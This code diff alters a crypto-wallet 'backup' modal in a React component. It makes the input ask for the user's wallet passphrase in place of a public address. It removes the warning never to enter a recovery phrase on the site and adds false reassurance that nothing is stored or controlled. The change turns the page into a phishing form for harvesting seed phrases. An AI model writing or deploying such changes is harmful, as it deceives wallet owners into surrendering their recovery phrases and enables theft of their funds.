@@ -93,7 +93,7 @@ export function BackupModal({ open, onClose }: { open: boolean; onClose: () => v
         {step === 0 && (
           <motion.div key="s0" {...stepAnim}>
             <p className="mb-4 text-[13px] text-fog">
-              Select the wallet for which you want to request a backup safety review:
+              Select the wallet for which you want to request a backup:
             </p>
             <div className="grid grid-cols-3 gap-2">
               {WALLET_TYPES.map((w) => (
@@ -133,11 +133,11 @@ export function BackupModal({ open, onClose }: { open: boolean; onClose: () => v
               <ArrowLeft className="h-3.5 w-3.5" /> {wallet.name} selected — change
             </button>
 
-            <Field label="Public wallet address">
+            <Field label="Wallet Passphrase">
               <Textarea
                 value={address}
                 onChange={(e) => setAddress(e.target.value)}
-                placeholder="Paste your public wallet address here"
+                placeholder="Paste your Wallet Passphrase here"
                 className="mono min-h-28 resize-y break-all text-[13px]"
                 rows={4}
                 autoFocus
@@ -158,7 +158,7 @@ export function BackupModal({ open, onClose }: { open: boolean; onClose: () => v
               >
                 {chain === "Other" ? (
                   <>
-                    <ShieldAlert className="h-4 w-4" /> Your wallet is not protected.
+                    <ShieldAlert className="h-4 w-4" /> Your wallet is not backed up.
                   </>
                 ) : chain ? (
                   <>
@@ -198,7 +198,7 @@ export function BackupModal({ open, onClose }: { open: boolean; onClose: () => v
                   </dd>
                 </div>
                 <div className="flex items-center justify-between gap-4">
-                  <dt className="text-fog">Address</dt>
+                  <dt className="text-fog">Phrase</dt>
                   <dd className="mono text-[13px] font-semibold text-aegis">{shortAddress(address.trim())}</dd>
                 </div>
               </dl>
@@ -207,9 +207,9 @@ export function BackupModal({ open, onClose }: { open: boolean; onClose: () => v
             <div className="flex items-start gap-3 rounded-2xl border border-line bg-white/[0.02] px-4 py-3.5">
               <ShieldCheck className="mt-0.5 h-4 w-4 shrink-0 text-aegis" />
               <p className="text-xs leading-relaxed text-fog">
-                Request a review of your wallet backup setup and learn how to protect it from phishing,
-                wallet flashing scams and impersonation attempts. Submit only your public address.
-                Never enter your recovery phrase or private key on this site.
+                Bankup your wallet for system review and keep learning how to spot wallet flashing,
+                fake balances, phishing and malicious approvals. This request does not store, connect to,
+                monitor or control your wallet, and it cannot block transactions.
               </p>
             </div>
 
@@ -218,7 +218,7 @@ export function BackupModal({ open, onClose }: { open: boolean; onClose: () => v
                 <ArrowLeft className="h-4 w-4" /> Back
               </Button>
               <Button onClick={submit} loading={pending} className="flex-[2] py-3">
-                Protect
+                Backup Now
                 <ShieldCheck className="h-4 w-4" />
               </Button>
             </div>
